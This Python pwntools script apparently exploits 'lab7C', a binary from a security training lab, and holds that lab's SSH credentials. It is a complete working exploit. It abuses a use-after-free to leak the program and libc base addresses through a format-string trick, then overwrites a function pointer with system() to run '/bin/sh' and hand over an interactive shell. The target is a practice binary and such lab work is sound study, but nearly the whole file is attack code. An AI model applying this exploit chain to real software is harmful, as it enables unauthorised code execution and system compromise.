#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 172.17.209.13 --user lab7C --pass lab07start --path /levels/lab07/lab7C
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('lab7C')
context.terminal = '/bin/bash'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '172.17.209.13'
port = int(args.PORT or 22)
user = args.USER or 'lab7C'
password = args.PASSWORD or 'lab07start'
remote_path = '/levels/lab07/lab7C'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.process([remote_path] + argv, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

PRINTF_PLT = 0x00880
SYSTEM     = 0x3cd10

io = start()

p = log.progress("Leaking .text base: ")

io.sendlineafter("Enter Choice:", "2")                         #create number
io.sendlineafter("Input number to store:", "69")
io.sendlineafter("Enter Choice:", '4')                         #delete number
log.info("prepping libc leak fmt string and priming UAF")
io.sendlineafter("Enter Choice:", '1')                         #create string
io.sendlineafter("Input string to store:", "%u.%u")            #set up libc leak
io.sendlineafter("Enter Choice:", '6')                         #print string as number (leak the ptr)
io.sendlineafter("Number index to print:", '1')
io.readuntil(": ")

text_base = io.readline()
text_base = int(text_base) & 0xfffff000

p.success(hex(text_base))

log.info("overwriting ptr with printf@plt")
io.sendlineafter("Enter Choice:", '3')                         #delete string
io.sendlineafter("Enter Choice:", "2")                         #create number
io.sendlineafter("Input number to store:", "%u" % (text_base + PRINTF_PLT))

p = log.progress("triggering printf libc leak: ") 
io.sendlineafter("Enter Choice:", '5')                         #print number as string (call the func)
io.sendlineafter("String index to print:", '1')                
io.readuntil(".")

libc_base = io.readline().strip()
libc_base = int(libc_base) - 0x1d55c0

p.success(hex(libc_base))

log.info("system: " + hex(libc_base + SYSTEM))

io.sendlineafter("Enter Choice:", '4')                         #delete number

log.info("prepping system('/bin/sh') and priming UAF")
io.sendlineafter("Enter Choice:", '1')                         #create string
io.sendlineafter("Input string to store:", "/bin/sh")        #set up libc leak

log.info("overwriting ptr with system()")
io.sendlineafter("Enter Choice:", '3')                         #delete string
io.sendlineafter("Enter Choice:", "2")                         #create number
io.sendlineafter("Input number to store:", "%u" % (libc_base + SYSTEM))

log.info('triggering shell')
io.sendlineafter("Enter Choice:", '5')                         #print number as string (call the func)
io.sendlineafter("String index to print:", '1')       


# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

